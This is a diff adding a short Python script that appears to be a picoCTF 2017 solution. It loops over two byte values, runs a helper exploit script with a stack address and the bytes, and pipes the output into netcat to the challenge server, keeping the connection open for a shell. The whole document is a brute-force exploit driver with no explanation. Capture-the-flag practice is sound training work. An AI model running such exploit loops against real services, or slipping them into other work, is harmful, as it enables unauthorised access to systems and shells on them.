@@ -1,0 +1,6 @@
+import sys
+import os
+
+for i in range(0x86, 0xff):
+    for j in range(0x00, 0xff):
+        os.system("(python monsters.py 0xffffdba4 " + str(i) + " " + str(j)  + "; cat) | nc shell2017.picoctf.com 4463")
